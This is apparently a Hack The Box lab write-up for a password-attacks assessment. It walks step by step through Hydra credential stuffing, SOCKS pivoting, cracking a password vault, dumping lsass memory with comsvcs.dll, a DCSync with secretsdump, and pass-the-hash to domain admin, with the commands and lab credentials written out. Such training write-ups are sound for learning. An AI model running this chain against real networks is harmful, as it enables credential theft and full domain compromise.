---
tags:
  - htb
  - linux
  - "#password"
  - skills-assesment
draft: false
date: 2026-05-22
title: skills-assessment-password-attacks
---

Based on the scenario, We knew that user _Betty Jayde_ reused the password `Texas123!@#` across multiple websites. Our first task is to generate her corporate username and check if she uses the same password.
Let's generate example username and try to get our way in.

```
./username-anarchy Betty Jayde >> username_wordlist.txt
```
```
echo 'Texas123!@#' >>password.txt
```
```
hydra -L username_wordlist.txt -P password.txt ssh://$IPAddress$
```

we found that Betty reuses her password for her corporate login:
`[22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#`

after checking `bash history` I found the potential password for william on `FILE01`:
`sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01`

another thing I do was creating a tunnel which I could pivot into internal subnet using port 9999:
```
sudo nano /etc/proxychains4.conf
```

adding this line to proxychains4.conf:
`socks5 127.0.0.1 9999`

and then I was able to create a tunnel:
```
ssh -D 9999 jbetty@10.129.234.116
```

using other window I could scan the host:
```
proxychains nmap -Pn -p 22,135,445,3389,5985 -sT 172.16.119.10
```

`PORT     STATE  SERVICE
22/tcp   closed ssh
135/tcp  open   msrpc
445/tcp  open   microsoft-ds
3389/tcp open   ms-wbt-server
5985/tcp open   wsman
`
I used found credentials to check `smb`:
```
sudo proxychains python3 /usr/share/doc/python3-impacket/examples/smbclient.py nexura.htb/hwilliam:'dealer-screwed-gym1'@172.16.119.10
```

let's check the shares:

```
ADMIN$
C$
HR
IPC$
IT
MANAGEMENT
PRIVATE
TRANSFER
```

after looking all shares I found 2 interessing files:
`Online passwords.xlsx`
`Employee-Passwords_OLD_013.ibak`

To extract credentials, I used **pwsafe2john** to convert the vault into a hash format

```
pwsafe2john Employee-Passwords_OLD_013.ibak > password.txt
```

and then I used john to get password:
```
john --wordlist=/usr/share/wordlists/rockyou.txt password.txt
```

After gaining access to the RDP session of user `bdavid`, my objective was to extract credentials from the `lsass.exe` process memory. First, I identified the process ID (PID) and performed a memory dump using `comsvcs.dll`:

DOS

```
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\Users\bdavid\AppData\Local\Temp\lsass.DMP full
```

Next, utilizing the mapped network share, I transferred the `lsass.DMP` file to my attacking machine for analysis using `pypykatz`:

Bash

```
pypykatz lsa minidump lsass.DMP
```

The analysis of the memory dump revealed clear-text credentials for the user `stom`:

- **Username:** `stom`
    
- **Password:** `calves-warp-learning1`
    
- **Domain:** `NEXURA.HTB`
    

### Privilege Escalation and Domain Domination

With the `stom` credentials in hand, I verified the user's permissions and explored the network for an escalation path to full domain compromise. Leveraging the `stom` account's permissions, I performed a **DCSync** attack to extract the NTDS database directly from the Domain Controller:

Bash

```
impacket-secretsdump nexura.htb/stom:'calves-warp-learning1'@172.16.119.7
```

As a result, I successfully recovered the NTLM hash of the `Administrator` account.

Using the recovered administrator hash, I gained full administrative access to the environment via `wmiexec`:

Bash

```
proxychains python3 wmiexec.py nexura.htb/Administrator@172.16.119.7 -hashes :%$hash%
```

After authenticating to the Domain Controller with `SYSTEM` privileges, the escalation process was complete, granting me total control over the `nexura.htb` infrastructure.